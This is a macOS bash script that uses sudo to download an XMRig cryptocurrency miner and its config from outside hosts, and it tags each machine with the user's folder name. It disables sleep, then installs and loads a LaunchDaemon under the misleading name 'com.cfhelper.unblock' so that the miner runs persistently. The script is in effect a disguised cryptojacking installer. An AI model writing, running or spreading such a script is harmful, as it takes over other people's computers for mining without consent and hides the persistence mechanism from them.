#!/bin/bash
sudo mkdir -p /usr/local/mycode
echo '/usr/local/mycode' | sudo tee -a /etc/paths
sudo curl -L -o /usr/local/mycode/xmrig https://github.com/Dashtiss/xmrig/releases/download/1.0.0/xmrig_universal_mac
sudo chmod +x /usr/local/mycode/xmrig
sudo curl -L -o /usr/local/mycode/config.json https://gist.githubusercontent.com/Dashtiss/60ea347a9f51bfd6677de45d7cd26117/raw/18be26e577499a330d1f02c8d8b46d919824397a/MyXMRigConfig.json
user_folder=$(basename $HOME)
config_file="/usr/local/mycode/config.json"
sudo sed -i '' 's/            "rig-id": "Macbooks"/            "rig-id": "'"$user_folder"'"/' "$config_file"
sudo pmset -c disablesleep 1
sudo pmset -c displaysleep 1
sudo pmset -c disksleep 0

sudo curl -L -o "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
    https://gist.githubusercontent.com/Dashtiss/071db37e5de7697d6a61777f9cae2a06/raw/04fa3ff93021fd58e666ff2f8d08163012e3e204/.plist
sudo chown root:wheel "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
sudo chmod 644 "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
sudo launchctl load "/Library/LaunchDaemons/com.cfhelper.unblock.plist"
